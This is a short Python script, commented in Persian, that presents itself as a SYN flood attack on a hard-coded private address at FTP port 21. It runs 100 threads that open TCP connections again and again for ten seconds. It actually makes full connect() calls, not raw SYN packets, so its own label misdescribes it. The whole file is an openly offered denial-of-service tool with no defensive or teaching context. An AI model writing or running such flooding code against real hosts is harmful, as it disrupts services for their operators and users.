import socket
import threading
import time

# تنظیمات هدف
target_ip = "192.168.0.116"
target_port = 21
stop_flag = threading.Event()

# تابع ارسال بسته‌های SYN
def syn_flood():
    while not stop_flag.is_set():
        try:
            # ایجاد یک بسته TCP با فلگ SYN
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.01)  # تنظیم تایم‌آوت کوچک
                s.connect((target_ip, target_port))
        except:
            # نادیده گرفتن خطاهای اتصال
            pass

# اجرای حمله در چندین رشته (Thread)
def start_attack(threads=10):
    for _ in range(threads):
        thread = threading.Thread(target=syn_flood)
        thread.daemon = True  # تنظیم برای بسته شدن با برنامه اصلی
        thread.start()

# برنامه اصلی
if __name__ == "__main__":
    print(f"Starting SYN flood to {target_ip}:{target_port}...")
    try:
        # تعداد رشته‌ها برای حمله (افزایش برای شدت بیشتر)
        start_attack(threads=100)

        # exec(open('doom1.py').read())
        # اجرای حمله به مدت معین
        time.sleep(10)  # تغییر مدت زمان حمله در اینجا
    except KeyboardInterrupt:
        print("Attack stopped by user.")
    finally:
        stop_flag.set()

        print("Stopping attack...")

    
